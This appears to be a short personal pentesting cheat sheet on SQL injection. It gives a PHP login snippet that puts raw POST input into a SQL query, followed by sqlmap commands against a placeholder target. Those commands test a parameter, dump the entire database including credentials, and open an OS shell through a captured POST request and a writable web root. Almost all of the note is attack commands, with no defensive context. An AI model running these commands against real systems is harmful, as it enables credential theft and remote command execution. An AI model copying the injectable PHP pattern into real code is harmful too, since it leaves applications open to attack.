---
title: SQL Injection
updated: 2025-04-22 12:53:20Z
created: 2025-04-21 02:07:48Z
latitude: 11.54487290
longitude: 104.89216680
altitude: 0.0000
---

## PHP
```
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
* * *
## sqlmap
`sqlmap -u http://<target>/blindsqli.php?user=1 -p user`

**Dump entire database (including credentials)**
`sqlmap -u http://<target>/blindsqli.php?user=1 -p user --dump`

Use sqlmap with a POST event
1. Capture the POST event in BurpSuite and save to file **post.txt**
2. Reference the file with **sqlmap**:
`sqlmap`
`-r <reference POST event file>`
`-p <parameter vulnerable to sqlmap>`
`--os-shell`
`--web-root <a writeable folder>`

`sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/<target_dir>"`